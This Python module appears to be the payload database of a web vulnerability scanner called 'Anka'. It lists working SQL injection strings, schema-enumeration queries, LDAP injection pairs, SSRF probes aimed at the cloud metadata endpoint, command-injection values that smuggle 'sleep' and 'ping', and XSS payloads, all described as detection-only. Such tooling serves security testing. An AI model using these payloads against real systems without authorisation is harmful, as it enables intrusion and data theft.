"""
Payload and signature database for Anka.
Organized by technique: boolean, error, time, union.
Not copied from SQLmap -- written independently from public SQLi knowledge.
"""

# --- Boolean-based payload pairs (TRUE, FALSE) ---
BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' OR '1'='1", "' OR '1'='2"),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    (" AND 1=1", " AND 1=2"),
    ("') AND ('1'='1", "') AND ('1'='2"),
    ("\") AND (\"1\"=\"1", "\") AND (\"1\"=\"2"),
    (" OR 1=1", " OR 1=2"),
    ("'||'1'='1", "'||'1'='2"),
    ("' AND 1=1#", "' AND 1=2#"),
    ("' AND (SELECT 1)=1--", "' AND (SELECT 1)=2--"),
]

# --- ORDER BY / GROUP BY / HAVING / LIMIT clause injection probes.
# These target queries where the injectable value sits after these
# clauses rather than in a WHERE predicate (e.g. ?sort=name). Detection
# reuses the boolean-blind true/false comparison technique. ---
CLAUSE_INJECTION_PAYLOADS = {
    "ORDER BY": [(" ORDER BY 1--", " ORDER BY 9999--")],
    "GROUP BY": [(" GROUP BY 1--", " GROUP BY 9999--")],
    "HAVING": [(" HAVING 1=1--", " HAVING 1=2--")],
    "LIMIT": [(" LIMIT 1--", " LIMIT 0--")],
}

# --- Stacked-query probes: only meaningful on DBMS/drivers that allow
# multiple statements per request (PostgreSQL, MSSQL; MySQL only with
# multi-statement support enabled). Detection-only (time-based), no
# destructive statements are ever used. ---
STACKED_QUERY_PROBES = {
    "MySQL": "'; SELECT SLEEP({delay})-- -",
    "PostgreSQL": "'; SELECT pg_sleep({delay})--",
    "MSSQL": "'; WAITFOR DELAY '0:0:{delay}'--",
}

# --- LDAP injection boolean-based probe pairs ---
LDAP_PAYLOADS = [
    ("*)(uid=*))(|(uid=*", "*)(uid=nonexistentuser*"),
    ("*)(|(objectclass=*", "*)(|(objectclass=nonexistent"),
]

# --- SSRF time-based blind probes: point the app at an address that is
# either unroutable (should time out fast/consistently) or a metadata
# endpoint (should behave differently if the app fetches it server-side). ---
SSRF_PROBES = [
    "http://169.254.169.254/latest/meta-data/",
    "http://10.255.255.1/",
    "http://[::1]:1/",
]

# --- Blind OS command injection time-based probes (detection only --
# confirms the app passes input to a shell; never opens an interactive
# shell or returns a command execution PoC). ---
COMMAND_INJECTION_PROBES = [
    "; sleep {delay}",
    "| sleep {delay}",
    "`sleep {delay}`",
    "$(sleep {delay})",
    "& ping -n {delay} 127.0.0.1 & ",
]

# --- Generic error-based probe payloads ---
ERROR_PAYLOADS = [
    "'",
    "\"",
    "')",
    "\")",
    "';",
    "' OR 1=1--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
]

# --- DBMS error signatures, used for fingerprinting + error-based detection ---
DBMS_ERROR_SIGNATURES = {
    "MySQL": [
        "you have an error in your sql syntax",
        "warning: mysql",
        "unknown column",
        "mysqlclient",
        "mysqli_",
    ],
    "PostgreSQL": [
        "pg_query()",
        "postgresql query failed",
        "unterminated quoted string",
        "syntax error at or near",
    ],
    "MSSQL": [
        "unclosed quotation mark",
        "microsoft sql server",
        "odbc sql server driver",
        "system.data.sqlclient",
    ],
    "Oracle": [
        "ora-01756",
        "ora-00933",
        "ora-00936",
        "quoted string not properly terminated",
    ],
    "SQLite": [
        "sqlite3::query",
        "sqlite_error",
        "near \"\": syntax error",
    ],
}

# --- Time-based blind payloads per DBMS, {delay} is substituted at runtime ---
TIME_PAYLOADS = {
    "MySQL": [
        "' AND SLEEP({delay})--",
        "' OR SLEEP({delay})#",
        "\" AND SLEEP({delay})--",
    ],
    "PostgreSQL": [
        "' AND (SELECT pg_sleep({delay}))--",
        "'; SELECT pg_sleep({delay})--",
    ],
    "MSSQL": [
        "'; WAITFOR DELAY '0:0:{delay}'--",
        "' WAITFOR DELAY '0:0:{delay}'--",
    ],
    "Oracle": [
        "' AND DBMS_LOCK.SLEEP({delay})--",
    ],
    "SQLite": [
        # SQLite has no native sleep; approximate with heavy recursive query
        "' AND (SELECT COUNT(*) FROM sqlite_master AS t1, sqlite_master AS t2, sqlite_master AS t3)--",
    ],
}

# --- UNION based helpers ---
ORDER_BY_TEMPLATE = "' ORDER BY {n}--"
UNION_NULL_TEMPLATE = "' UNION SELECT {nulls}--"

COMMENT_STYLES = {
    "MySQL": "-- -",
    "PostgreSQL": "--",
    "MSSQL": "--",
    "Oracle": "--",
    "SQLite": "--",
}

INFO_SCHEMA_QUERIES = {
    "MySQL": {
        "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
        "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        "version": "SELECT version()",
    },
    "PostgreSQL": {
        "tables": "SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
        "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        "version": "SELECT version()",
    },
    "MSSQL": {
        "tables": "SELECT table_name FROM information_schema.tables",
        "columns": "SELECT column_name FROM information_schema.columns WHERE table_name='{table}'",
        "version": "SELECT @@version",
    },
    "SQLite": {
        "tables": "SELECT name FROM sqlite_master WHERE type='table'",
        "columns": "SELECT sql FROM sqlite_master WHERE type='table' AND name='{table}'",
        "version": "SELECT sqlite_version()",
    },
}

# --- Reflected XSS probe payloads. Each contains a unique marker string
# ("ankaXSS") so the detector can confirm *unescaped* reflection rather than
# matching on generic HTML. Detection only -- no cookie theft / exfil code. ---
XSS_PAYLOADS = [
    "<script>/*ankaXSS*/alert(1)</script>",
    "\"><svg/onload=alert(/ankaXSS/)>",
    "'><img src=x onerror=alert(/ankaXSS/)>",
    "<img src=x onerror=\"/*ankaXSS*/alert(1)\">",
    "javascript:/*ankaXSS*/alert(1)",
]
